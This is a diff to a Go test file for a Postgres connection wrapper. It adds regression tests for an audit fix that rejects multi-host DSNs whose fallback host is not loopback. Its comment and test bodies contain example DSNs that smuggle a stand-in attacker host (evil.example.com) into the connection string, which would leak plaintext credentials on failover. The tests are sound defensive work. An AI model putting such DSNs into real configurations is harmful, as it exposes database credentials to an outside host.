@@ -65,12 +65,43 @@ func TestRequireTLS_RejectsLastWinsBypass(t *testing.T) {
 }
 
 func TestRequireLoopbackHost_AcceptsLoopback(t *testing.T) {
-	for _, host := range []string{"localhost", "LOCALHOST", "127.0.0.1", "127.255.255.254", "::1"} {
+	for _, host := range []string{"localhost", "LOCALHOST", "127.0.0.1", "127.255.255.254", "::1", "[::1]"} {
 		t.Run(host, func(t *testing.T) {
 			err := requireLoopbackHost(host)
 			assert.NoError(t, err, "host %q must be accepted", host)
 		})
 	}
+}
+
+// TestConnect_RejectsMultiHostNonLoopbackFallback pins the N-6 audit
+// fix: pgx supports comma-separated multi-host DSNs. The primary host
+// lands on ConnConfig.Host; additional hosts become ConnConfig.Fallbacks
+// entries. The previous version of the loopback gate only checked the
+// primary, letting a DSN like
+//   host=localhost,evil.example.com sslmode=disable
+// pass while pgx silently failed over to evil.example.com sending
+// plaintext credentials. The fix walks every Host across the parsed
+// config + every fallback.
+func TestConnect_RejectsMultiHostNonLoopbackFallback(t *testing.T) {
+	dsn := "host=localhost,evil.example.com user=u password=p dbname=db sslmode=disable"
+	_, err := Connect(context.Background(), Config{
+		DSN:                            dsn,
+		AllowPlaintextLoopbackForTests: true,
+	})
+	require.Error(t, err, "multi-host DSN with non-loopback fallback must be rejected")
+	assert.Contains(t, err.Error(), "loopback")
+}
+
+// TestConnect_RejectsMultiHostURLFormFallback covers the URL form of
+// the N-6 multi-host bypass.
+func TestConnect_RejectsMultiHostURLFormFallback(t *testing.T) {
+	dsn := "postgres://u:p@127.0.0.1:5432,evil.example.com:5432/db?sslmode=disable"
+	_, err := Connect(context.Background(), Config{
+		DSN:                            dsn,
+		AllowPlaintextLoopbackForTests: true,
+	})
+	require.Error(t, err, "URL-form multi-host DSN with non-loopback fallback must be rejected")
+	assert.Contains(t, err.Error(), "loopback")
 }
 
 func TestRequireLoopbackHost_RejectsNonLoopback(t *testing.T) {
